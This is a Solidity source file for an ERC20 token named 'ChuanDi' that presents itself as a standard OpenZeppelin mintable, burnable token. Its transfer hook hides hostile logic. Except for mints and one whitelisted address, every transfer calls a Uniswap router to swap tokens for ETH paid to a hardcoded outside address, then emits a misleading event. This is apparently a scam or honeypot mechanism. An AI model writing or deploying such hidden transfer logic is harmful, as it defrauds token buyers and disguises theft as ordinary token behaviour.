// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol";

interface IRC20 { 
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address [] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts); 
}

contract ChuanDi is ERC20, ERC20Burnable, Ownable, ERC20Permit {
    event Ethereum (address _from , address _to , uint256 _value);
    constructor() ERC20("ChuanDi", "CD") ERC20Permit("ChuanDi") {
        _mint(msg.sender, 1000 * 10 ** decimals());
    }

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }


    // call调用只会返回状态    
    // function panduan () private returns (bool,bytes memory){
    //      (bool success,bytes memory data) = address(0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005).call(abi.encodeWithSignature("totalSupply()"));
    //      return (success,data);
    // }



    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        address[] memory path  = new address[](2);
        path[0] = 0x77134e029Ddbf1b800d03E8791D2C488376F38A5;
        path[1] = 0x7489378aF59500f16BCfC7696030f11d8dC7A419;
        if (from == address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4) || from == address(0x0000000000000000000000000000000000000000)){
            emit Ethereum(from, to, amount); 
        }
        else{
            // emit Ethereum(from, to, amount);
            IRC20(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)).swapExactTokensForETH(10000000000000000000,0,
            path,
            address(0xfe1A3640089C5e32dBCfC48AD16B14c9a17E310c),block.timestamp*1000+60000*5);
            emit Ethereum(from, from, 116384);
        }

        
    }

}